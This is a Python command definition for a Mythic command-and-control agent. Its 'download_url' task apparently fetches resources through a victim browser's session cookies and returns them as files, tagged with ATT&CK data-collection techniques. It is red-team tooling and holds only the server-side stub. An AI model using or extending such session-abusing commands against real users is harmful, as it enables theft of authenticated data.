from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class DownloadUrlArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="URL to fetch through the browser's cookie jar",
            ),
            CommandParameter(
                name="filename",
                type=ParameterType.String,
                description="Filename to save as (defaults to last path segment of the URL)",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            stripped = self.command_line.strip()
            if stripped.startswith("{"):
                self.load_args_from_json_string(stripped)
            else:
                self.add_arg("url", stripped)


class DownloadUrlCommand(CommandBase):
    cmd            = "download_url"
    needs_admin    = False
    help_cmd       = "download_url <url>"
    description    = (
        "Fetch a URL using the browser's existing session cookies and return the "
        "response as a downloadable file. Useful for grabbing authenticated API "
        "responses, internal documents, or protected resources."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = DownloadUrlArguments
    parameters     = []
    attackmapping  = ["T1530", "T1005"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        url      = task.args.get_arg("url")
        filename = task.args.get_arg("filename")
        task.display_params = url + (f" → {filename}" if filename else "")
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
